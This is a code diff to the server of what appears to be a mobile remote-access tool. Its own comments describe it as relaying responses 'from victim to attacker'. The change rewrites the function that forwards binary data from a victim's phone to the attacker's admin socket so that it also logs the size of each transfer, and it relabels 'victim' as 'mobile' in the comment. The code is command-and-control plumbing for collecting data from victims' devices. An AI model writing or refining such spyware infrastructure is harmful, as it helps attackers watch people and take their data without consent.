@@ -88,13 +88,42 @@ const response =(action, data)=>{// response from victim to attacker
     }
   }
   
-const responseBinary =(action, data, callback)=>{// response from victim to attacker
-    if(adminSocketId){
-        log("response action: "+ action);
-        callback("success")
+// const responseBinary =(action, data, callback)=>{// response from victim to attacker
+//     if(adminSocketId){
+//         log("response action: "+ action);
+//         callback("success")
+//         io.to(adminSocketId).emit(action, data);
+//     }
+//   }
+
+const responseBinary = (action, data, callback) => { // response from mobile
+    if (adminSocketId) {
+        // Calculate data size
+        let dataSize = 0;
+        if (data) {
+            if (typeof data === 'string') {
+                dataSize = Buffer.byteLength(data, 'utf8');
+            } else if (Buffer.isBuffer(data)) {
+                dataSize = data.length;
+            } else if (typeof data === 'object') {
+                dataSize = Buffer.byteLength(JSON.stringify(data), 'utf8');
+            }
+        }
+        
+        // Format size for readability
+        const formatSize = (bytes) => {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
+        };
+        
+        log(`response action: ${action} | size: ${formatSize(dataSize)}`);
+        callback("success");
         io.to(adminSocketId).emit(action, data);
     }
-  }
+}
 
 // Handle backup initiation and send response to admin
 const handleBackupInitiation = (socket, action, moduleName) => {
